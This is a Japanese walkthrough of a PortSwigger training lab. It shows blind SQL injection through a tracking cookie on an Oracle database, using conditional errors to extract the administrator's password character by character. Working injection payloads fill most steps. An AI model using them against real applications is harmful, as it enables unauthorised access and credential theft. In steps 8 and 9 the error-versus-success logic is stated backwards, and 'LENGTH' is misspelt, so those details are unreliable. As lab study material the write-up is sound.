# 条件付きエラーを伴うブラインド SQL インジェクション

次のハッキングラボを実施します  
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors  
このラボにはブラインド SQL インジェクションの脆弱性が含まれています。アプリケーションは分析に追跡 Cookie を使用し、送信された Cookie の値を含む SQL クエリを実行します。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ブラウザからハッキングラボにアクセスします
- 3. TrackingId を含む Cookie があるリクエストを send to repeater します
- 4. クエリを付加してリクエストを送信すると失敗します

```
Cookie: TrackingId=AuqZKS4ZK1k06s2b'||(SELECT '')||'
```

- 5. Oracle の構文でリクエストを修正して送信します。エラーが出ませんでした。

```
Cookie: TrackingId=AuqZKS4ZK1k06s2b'||(SELECT '' FROM dual)||';
```

- 6. users テーブルの存在を確認します。エラーが出ないのでテーブルが存在します。

```
Cookie: TrackingId=AuqZKS4ZK1k06s2b'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

- 7. 以下の SQL でデータを探ります

```
Cookie: TrackingId=AuqZKS4ZK1k06s2b'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

- 8. ユーザーの存在有無を確認します。エラーにならないので administrator が存在します。

```
Cookie: TrackingId=AuqZKS4ZK1k06s2b'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- 9. パスワード文字数を探ります

```
Cookie: TrackingId=AuqZKS4ZK1k06s2b'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

ENGTH(password)>19 はエラーにならず、ENGTH(password)>20 はエラーになるのでパスは 20 文字です。

- 10. リクエストを send to intruder します
- 11. 以下のリクエストを桁を変えながら 20 回行います

```
Cookie: TrackingId=AuqZKS4ZK1k06s2b'||(SELECT CASE WHEN SUBSTR(password,1,1)='$a$' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

パラメータリストは 0 ～ 9, a ～ z を登録してアタックします、
アタック成功した文字のエラーコードは 500 で返ってきます。
SUBSTR(password,20,1)まで行います。

- 12. 判明したパスワードと id でログインします
